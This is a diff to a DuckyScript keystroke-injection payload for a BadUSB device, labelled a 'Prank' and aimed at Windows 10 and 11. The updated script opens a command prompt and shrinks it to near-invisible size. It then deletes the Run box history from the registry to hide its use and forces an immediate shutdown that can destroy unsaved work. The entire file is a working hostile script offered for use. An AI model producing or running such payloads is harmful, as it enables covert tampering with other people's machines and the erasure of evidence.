@@ -1,19 +1,23 @@
 DUCKY_LANG DE
-REM Title: Delete Run box history and Shutdown Windows
+REM Title: Shutdown
 REM Author: LingLingAZN
-REM Description: Delete the run box history and Shutdown Windows and 
+REM Description: Open CMD prompt as small as possible. Delete the run box history and Shutdown Windows
 REM Target: Windows 10 & 11
-REM Version: WIP
+REM Version: 1.0
 REM Category: Prank
 REM ---------------------
 GUI r
-DELAY 100
+DELAY 200
 STRING cmd
 DELAY 100
 ENTER
 DELAY 500
+STRING MODE 15,1
+ENTER
+DELAY 100
 STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 DELAY 1000
 ENTER
 STRING shutdown /s /t 0 /f
+DELAY 100
 ENTER
